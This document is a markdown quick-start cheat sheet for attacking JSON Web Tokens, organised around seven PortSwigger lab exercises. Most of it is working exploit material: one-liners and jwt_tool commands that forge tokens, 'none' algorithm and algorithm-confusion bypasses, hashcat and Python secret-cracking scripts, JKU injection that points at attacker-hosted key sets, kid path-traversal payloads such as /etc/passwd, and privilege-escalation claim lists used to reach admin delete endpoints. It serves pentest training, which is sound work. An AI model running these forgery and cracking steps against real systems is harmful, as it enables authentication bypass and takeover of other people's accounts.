# JWT Attacks - Quick-Start Guide

Fast reference for JWT vulnerability testing and exploitation. Get from zero to compromise in minutes.

---

## 30-Second JWT Test

```bash
# 1. Capture JWT from login
TOKEN="eyJhbGci..."

# 2. Test signature verification
echo $TOKEN | sed 's/\.[^.]*$/\.INVALID_SIGNATURE/' | curl -H "Authorization: Bearer $(cat -)" https://target.com/api

# 3. Test none algorithm
python3 jwt_tool.py $TOKEN -X a

# 4. Crack weak secret (5 min)
hashcat -a 0 -m 16500 token.txt jwt.secrets.list
```

**If any test succeeds → Full authentication bypass possible**

---

## Lab Completion Times

| Lab | Difficulty | Time | Key Technique |
|-----|-----------|------|---------------|
| 1. Unverified Signature | Apprentice | **1 min** | Modify payload, keep signature |
| 2. None Algorithm | Apprentice | **2 min** | alg=none, remove signature |
| 3. Weak Secret | Practitioner | **5 min** | hashcat brute force |
| 4. JWK Injection | Practitioner | **3 min** | Embed public key |
| 5. JKU Injection | Practitioner | **4 min** | External key fetch |
| 6. Kid Traversal | Practitioner | **3 min** | /dev/null path |
| 7. Algorithm Confusion | Practitioner | **5 min** | RS256→HS256 |

**Total: 23 minutes for all 7 labs**

---

## Quick Attack Decision Tree

```
JWT received
    │
    ├─→ Can modify without re-signing? → Lab 1 (1 min)
    │
    ├─→ Accepts alg=none? → Lab 2 (2 min)
    │
    ├─→ Weak HMAC secret? → Lab 3 (5 min)
    │   └─→ hashcat -m 16500
    │
    ├─→ Has jwk parameter? → Lab 4 (3 min)
    │   └─→ Embed own public key
    │
    ├─→ Has jku parameter? → Lab 5 (4 min)
    │   └─→ Point to attacker server
    │
    ├─→ Has kid parameter? → Lab 6 (3 min)
    │   └─→ ../../../dev/null
    │
    └─→ RS256 with public key? → Lab 7 (5 min)
        └─→ Convert to HS256
```

---

## Rapid Testing Methodology

### Phase 1: Initial Recon (30 seconds)

```bash
# Decode JWT
echo "eyJ..." | cut -d. -f1-2 | while IFS=. read h p; do
    echo $h | base64 -d 2>/dev/null | jq
    echo $p | base64 -d 2>/dev/null | jq
done

# Look for:
# - alg: Algorithm type
# - kid: Key ID (path traversal?)
# - jwk: Embedded key
# - jku: Key URL
```

### Phase 2: Signature Test (1 minute)

```python
# Test 1: No verification
import jwt
token = "eyJ..."
payload = jwt.decode(token, options={"verify_signature": False})
# Modify payload
malicious = jwt.encode(payload, "any-key", algorithm="HS256")
# Test if accepted

# Test 2: None algorithm
header = '{"alg":"none","typ":"JWT"}'
payload = '{"sub":"admin"}'
import base64
none_token = base64.b64encode(header.encode()).decode().rstrip('=') + '.' + \
             base64.b64encode(payload.encode()).decode().rstrip('=') + '.'
# Test none_token
```

### Phase 3: Secret Cracking (5 minutes max)

```bash
# Quick test with common secrets
for secret in secret secret1 password admin; do
    python3 -c "import jwt; jwt.decode('$TOKEN', '$secret', algorithms=['HS256'])" 2>/dev/null && echo "Found: $secret" && break
done

# Automated cracking
hashcat -a 0 -m 16500 token.txt jwt.secrets.list --force
# Wait max 5 minutes, if not found → move on
```

### Phase 4: Header Exploitation (2-3 minutes each)

```bash
# JWK injection
python3 jwt_tool.py $TOKEN -X i

# JKU injection
python3 jwt_tool.py $TOKEN -X s -ju https://attacker.com/jwks.json

# Kid traversal
python3 jwt_tool.py $TOKEN -X k
```

---

## One-Liner Exploits

### Lab 1: Unverified Signature
```python
python3 -c "import jwt; print(jwt.encode({'sub':'administrator'}, 'ignored', algorithm='HS256'))"
```

### Lab 2: None Algorithm
```bash
echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '\n=' && echo -n '.' && echo '{"sub":"administrator"}' | base64 | tr -d '\n=' && echo '.'
```

### Lab 3: Weak Secret
```bash
hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list --quiet && hashcat jwt.txt --show
```

### Lab 4: JWK Injection
```python
python3 jwt_tool.py eyJ... -X i -pc sub -pv administrator
```

### Lab 5: JKU Injection
```python
python3 jwt_tool.py eyJ... -X s -ju https://exploit-server.net/jwks.json -pc sub -pv administrator
```

### Lab 6: Kid Traversal
```python
python3 jwt_tool.py eyJ... -I -hc kid -hv "../../../../../../../dev/null" -pc sub -pv administrator -S
```

### Lab 7: Algorithm Confusion
```python
python3 jwt_tool.py eyJ... -X k -pk public.pem -pc sub -pv administrator
```

---

## Essential Burp Suite Workflow

### Setup (1 minute)
1. Install JWT Editor extension
2. Capture login request
3. Send to Repeater

### Exploitation (2-3 minutes per attack)

**Test 1: Modify Claims**
```
1. JSON Web Token tab → modify payload
2. Don't re-sign
3. Send → check response
```

**Test 2: None Algorithm**
```
1. JSON Web Token tab → Header
2. Change alg to "none"
3. Remove signature (keep trailing dot)
4. Send
```

**Test 3: Weak Secret**
```
1. Copy JWT to file
2. Run hashcat
3. If cracked → Sign with discovered secret
```

**Test 4: JWK Injection**
```
1. JWT Editor Keys → New RSA Key
2. JSON Web Token tab → Attack → Embedded JWK
3. Select generated key
4. Send
```

**Test 5: Algorithm Confusion**
```
1. Fetch public key from /jwks.json
2. JWT Editor Keys → New RSA Key → paste JWK
3. Export as PEM → Base64 encode
4. JWT Editor Keys → New Symmetric Key → paste encoded PEM as k
5. Change alg to HS256
6. Sign with symmetric key
```

---

## Common Payloads

### Privilege Escalation Claims

```json
{"sub": "administrator"}
{"sub": "admin"}
{"user": "admin"}
{"username": "administrator"}
{"role": "admin"}
{"roles": ["admin", "superuser"]}
{"is_admin": true}
{"privilege": 100}
{"permissions": ["all"]}
{"scope": "admin:all"}
```

### Temporal Bypass

```json
{"exp": 9999999999}
{"exp": null}
{"nbf": 0}
{"iat": 0}
```

### Path Traversal (kid)

```
../../../../../../../dev/null
../../../../../../../etc/passwd
../../../../../../../proc/version
../../../../../../app/keys/public.key
```

### None Algorithm Variations

```json
{"alg": "none"}
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
```

---

## Quick Tools Reference

### jwt_tool
```bash
# All attacks
python3 jwt_tool.py JWT -M at

# Specific attacks
-X a  # Algorithm confusion
-X i  # JWK injection
-X s  # JKU injection
-X k  # Kid injection
-C    # Crack secret
-T    # Tamper claims
```

### hashcat
```bash
# HS256
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# HS384
hashcat -a 0 -m 16511 jwt.txt wordlist.txt

# HS512
hashcat -a 0 -m 16512 jwt.txt wordlist.txt

# GPU optimization
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -w 3 -O
```

### Python Quick Scripts

**Test Signature Verification:**
```python
import jwt
token = "eyJ..."
try:
    # Try decoding without secret
    payload = jwt.decode(token, options={"verify_signature": False})
    print("[+] Signature not verified! Vulnerable!")
    print(payload)
except:
    print("[-] Signature verification enforced")
```

**Create None Token:**
```python
import base64, json

header = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).decode().rstrip('=')

payload = base64.urlsafe_b64encode(
    json.dumps({"sub":"admin"}).encode()
).decode().rstrip('=')

print(f"{header}.{payload}.")
```

**Crack Secret:**
```python
import jwt

token = "eyJ..."
wordlist = open('secrets.txt').read().splitlines()

for secret in wordlist:
    try:
        jwt.decode(token, secret, algorithms=['HS256'])
        print(f"[+] Found: {secret}")
        break
    except:
        continue
```

---

## Cheat Sheet by Lab

### Lab 1: Unverified Signature (1 minute)

**Goal**: Access /admin and delete carlos

**Steps**:
1. Login as wiener:peter
2. Burp → Repeater
3. JSON Web Token tab → Change sub to "administrator"
4. Send (don't re-sign)
5. Access /admin/delete?username=carlos

**Success Indicator**: 200 OK on /admin

---

### Lab 2: None Algorithm (2 minutes)

**Goal**: Access /admin with unsigned token

**Steps**:
1. Login as wiener:peter
2. JSON Web Token tab → Header → alg="none"
3. Payload → sub="administrator"
4. Remove signature, keep trailing dot
5. Send
6. /admin/delete?username=carlos

**Token Format**: `header.payload.`

---

### Lab 3: Weak Secret (5 minutes)

**Goal**: Crack HMAC secret and forge token

**Steps**:
1. Extract JWT after login
2. `hashcat -a 0 -m 16500 token.txt jwt.secrets.list`
3. Found: **secret1**
4. JWT Editor Keys → New Symmetric Key
5. k = base64("secret1") = "c2VjcmV0MQ=="
6. Sign token with discovered key
7. /admin/delete?username=carlos

**Secret Found**: secret1

---

### Lab 4: JWK Injection (3 minutes)

**Goal**: Embed attacker's public key

**Steps**:
1. JWT Editor Keys → New RSA Key → Generate
2. JSON Web Token tab → Attack → Embedded JWK
3. Select generated key
4. Change sub to "administrator"
5. Send
6. /admin/delete?username=carlos

**Header Added**: `"jwk": {...}`

---

### Lab 5: JKU Injection (4 minutes)

**Goal**: External key fetch from attacker server

**Steps**:
1. JWT Editor Keys → New RSA Key → Generate
2. Copy Public Key as JWK
3. Exploit server → Body: `{"keys":[<JWK>]}`
4. JSON Web Token tab → Add jku header
5. jku = "https://exploit-server.net/jwks.json"
6. kid = key ID from JWK
7. Sign with generated key
8. /admin/delete?username=carlos

**Exploit Server Path**: /jwks.json

---

### Lab 6: Kid Traversal (3 minutes)

**Goal**: Use /dev/null as signing secret

**Steps**:
1. JWT Editor Keys → New Symmetric Key
2. k = "AA==" (Base64 null byte)
3. JSON Web Token tab → Header
4. kid = "../../../../../../../dev/null"
5. Payload → sub = "administrator"
6. Sign with null-byte key
7. /admin/delete?username=carlos

**Secret**: Null byte (0x00)

---

### Lab 7: Algorithm Confusion (5 minutes)

**Goal**: Use public key as HMAC secret

**Steps**:
1. Navigate to /jwks.json
2. Copy public key JWK
3. JWT Editor Keys → New RSA Key → Paste JWK
4. Right-click → Copy Public Key as PEM
5. Decoder → Base64 encode PEM
6. JWT Editor Keys → New Symmetric Key
7. k = Base64-encoded PEM
8. JSON Web Token tab → alg="HS256"
9. sub="administrator"
10. Sign with symmetric key
11. /admin/delete?username=carlos

**Algorithm Change**: RS256 → HS256

---

## Troubleshooting

### Issue: Token Not Accepted

**Check**:
- Signature format (3 dot-separated parts)
- Base64 encoding (URL-safe)
- Trailing dot for none algorithm
- Cookie name (session, token, jwt, etc.)

### Issue: Hashcat Not Finding Secret

**Try**:
- Larger wordlist (rockyou.txt)
- Different hash mode (16511, 16512)
- Common defaults: secret, secret1, password
- Give up after 5 minutes → try other attacks

### Issue: JWK/JKU Not Working

**Verify**:
- JSON format valid
- All required JWK fields present
- HTTPS for exploit server
- kid matches between header and JWK

### Issue: Algorithm Confusion Fails

**Check**:
- Public key correctly exported as PEM
- PEM includes BEGIN/END markers
- Base64 encoding complete
- alg changed to HS256 in header

---

## Success Indicators

### Vulnerable Application Signs:
- ✓ Modified claims accepted without re-signing
- ✓ None algorithm not rejected
- ✓ Default/weak secrets in use
- ✓ Header parameters trusted
- ✓ Algorithm mismatch accepted

### Secure Implementation Signs:
- ✗ Signature verification enforced
- ✗ Algorithm whitelist enforced
- ✗ Strong, random secrets
- ✗ Header parameters validated
- ✗ kid/jku/jwk parameters rejected

---

## Next Steps After Finding Vulnerability

1. **Document the vulnerability**:
   - Request/response showing exploitation
   - Claims modified
   - Access granted

2. **Test impact**:
   - Can access other users?
   - Can escalate privileges?
   - Can perform administrative actions?

3. **Write PoC**:
   - Python script for automated exploitation
   - Burp Suite saved request
   - curl command for reproduction

4. **Report findings**:
   - Vulnerability type
   - Affected endpoints
   - Impact assessment
   - Remediation recommendations

---

## Common Mistakes to Avoid

❌ **Forgetting trailing dot** in none algorithm
✓ **Always**: `header.payload.`

❌ **Wrong Base64 encoding** (standard vs URL-safe)
✓ **Use**: URL-safe Base64 without padding

❌ **Not checking "Don't modify header"** when signing
✓ **Verify**: Header changes preserved

❌ **Testing only one attack type**
✓ **Try all**: Often multiple vulnerabilities present

❌ **Giving up after failed secret crack**
✓ **Move on**: Try header parameter attacks

---

## Time-Saving Tips

1. **Test signature verification first** (fastest to exploit)
2. **Use jwt_tool automated mode** for quick scan
3. **Pre-install Burp JWT Editor** before starting
4. **Have wordlists ready** (jwt.secrets.list)
5. **Script repetitive tasks** (Python one-liners)
6. **Use Burp Repeater tabs** for parallel testing
7. **Copy working payloads** to notes for reuse

---

## Resources

**Lab Solutions**: `portswigger_jwt_labs.md`
**Attack Techniques**: `jwt_attack_techniques.md`
**Security Resources**: `jwt_security_resources.md`

**Tools**:
- jwt_tool: https://github.com/ticarpi/jwt_tool
- Burp JWT Editor: BApp Store
- hashcat: https://hashcat.net/

**Wordlists**:
- jwt.secrets.list: https://github.com/wallarm/jwt-secrets
- rockyou.txt: Standard pentesting wordlist

---

**Remember**: All testing should be performed on authorized targets only. JWT vulnerabilities can lead to complete authentication bypass and system compromise.
